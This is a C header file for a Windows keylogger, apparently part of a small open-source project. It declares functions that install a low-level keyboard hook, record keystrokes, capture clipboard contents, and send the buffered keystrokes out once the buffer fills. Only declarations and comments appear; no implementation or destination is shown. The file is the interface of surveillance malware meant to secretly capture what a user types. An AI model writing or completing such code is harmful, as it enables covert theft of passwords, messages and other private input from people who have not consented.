//====================================================================================================================================
//!
//!	\file    Keylogger.h
//!
//! \author  MyLibh
//! \date    23 Sep 2018
//!
//! \brief	 Functions used to work for Keylogger 
//!
//====================================================================================================================================

#ifndef __KEYLOGGER_H_INCLUDED__
#define __KEYLOGGER_H_INCLUDED__

#include <Windows.h>

//====================================================================================================================================
//!
//! \brief	 Translates virtual key code into name
//!
//! \param   vkCode  Virtual key code
//!
//! \return  Ñonstant pointer to a TCHAR with the name of a key("[KEY_NAME]")
//!
//====================================================================================================================================

CONST PTCHAR GetVirtualKeyName(DWORD vkCode);

//====================================================================================================================================
//!
//! \brief	 Receives a clipboard buffer
//!
//! \return  Ñonstant pointer to a TCHAR with the clipboard buffer
//!
//! \note    If an error occurs, it will be displayed in console(STD_OUTPUT_HANDLE)
//!
//====================================================================================================================================

CONST PTCHAR GetClipboardBuffer();

//====================================================================================================================================
//!
//! \brief	 Logs the key into buffer, when the buffer is full sends it using 'SendBuffer'
//!
//! \param   kbdhs  Information about a low-level keyboard input event
//!
//! \return  The result of logging the key
//!
//! \note    If an error occurs, it will be displayed in console(STD_OUTPUT_HANDLE)
//!
//====================================================================================================================================

BOOL LogKey(CONST PKBDLLHOOKSTRUCT kbdhs);

//====================================================================================================================================
//!
//! \brief	 Hook procedure
//!
//! \param   code  
//! \param   wParam  Specifies whether the message was sent by the current thread 
//! \param   lParam  A pointer to a CWPSTRUCT structure that contains details about the message
//! 
//! \return  This value is returned by the next hook procedure in the chain
//!
//! \note    If an error occurs, it will be displayed in console(STD_OUTPUT_HANDLE)
//!
//====================================================================================================================================

LRESULT WINAPI KeyboardHook(INT code, WPARAM wParam, LPARAM lParam);

//====================================================================================================================================
//!
//! \brief	 Sets the keyboard hook
//!
//! \return  The result of setting the keyboard hook
//!
//! \note    If an error occurs, it will be displayed in console(STD_OUTPUT_HANDLE)
//!
//====================================================================================================================================

BOOL SetKeyboardHook();

#endif /* __KEYLOGGER_H_INCLUDED__ */